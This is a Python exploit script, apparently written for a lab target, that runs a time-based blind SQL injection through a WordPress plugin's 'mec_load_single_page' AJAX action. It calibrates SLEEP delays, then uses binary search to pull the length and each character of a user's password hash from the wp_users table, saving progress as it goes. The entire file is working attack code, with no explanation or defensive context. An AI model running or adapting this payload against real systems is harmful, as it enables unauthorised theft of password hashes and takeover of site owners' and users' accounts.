#!/usr/bin/env python3
import requests,time,statistics,os,sys,argparse

ap=argparse.ArgumentParser()
ap.add_argument('--ip',default='10.66.152.69')
ap.add_argument('--id',type=int,default=1)
ap.add_argument('--out',required=True)
ap.add_argument('--maxlen',type=int,default=60)
ap.add_argument('--sleep',type=int,default=2)
args=ap.parse_args()

base=f"http://{args.ip}/wordpress/wp-admin/admin-ajax.php"
s=requests.Session()

def health():
    try:
        return s.get(f"http://{args.ip}/",timeout=4).status_code==200
    except Exception:
        return False

def tquery(cond,retries=2):
    payload=f"2) AND (SELECT 1380 FROM (SELECT(IF(({cond}),SLEEP({args.sleep}),0)))aaPj) AND (3691=3691"
    for _ in range(retries):
        try:
            t0=time.time(); r=s.get(base,params={'action':'mec_load_single_page','time':payload},timeout=14); dt=time.time()-t0
            if r.status_code in (200,500): return dt
        except Exception:
            pass
        time.sleep(0.4)
    return None

if not health():
    print('[!] health down'); sys.exit(2)

tr=[];fa=[]
for _ in range(2):
    a=tquery('1=1'); b=tquery('1=0')
    if a is None or b is None:
        print('[!] calibration request failed'); sys.exit(2)
    tr.append(a); fa.append(b)
thr=(statistics.median(tr)+statistics.median(fa))/2
print(f"[*] threshold={thr:.3f} true~{tr} false~{fa}", flush=True)

def is_true(cond):
    dt=tquery(cond)
    if dt is None: return None
    return dt>thr

result=''
if os.path.exists(args.out):
    result=open(args.out).read().strip()
print(f"[*] resume len={len(result)} val='{result}'", flush=True)

# length
lo,hi=1,args.maxlen
while lo<=hi:
    if not health():
        print('[!] health down during len'); open(args.out,'w').write(result); sys.exit(2)
    mid=(lo+hi)//2
    v=is_true(f"LENGTH((SELECT user_pass FROM wordpress.wp_users WHERE ID={args.id}))>{mid}")
    if v is None:
        print('[!] req fail during len'); open(args.out,'w').write(result); sys.exit(2)
    if v: lo=mid+1
    else: hi=mid-1
length=lo
print(f"[*] inferred length={length}", flush=True)

for pos in range(len(result)+1,length+1):
    if not health():
        print(f"[!] health down at pos {pos}"); open(args.out,'w').write(result); sys.exit(2)
    l,r=32,126
    while l<=r:
        m=(l+r)//2
        v=is_true(f"ASCII(SUBSTRING((SELECT user_pass FROM wordpress.wp_users WHERE ID={args.id}),{pos},1))>{m}")
        if v is None:
            print(f"[!] req fail pos {pos} mid {m}"); open(args.out,'w').write(result); sys.exit(2)
        if v: l=m+1
        else: r=m-1
    ch=chr(l); result+=ch
    open(args.out,'w').write(result)
    print(f"[+] pos {pos}: {ch} -> {result}", flush=True)

print('[DONE]',result)
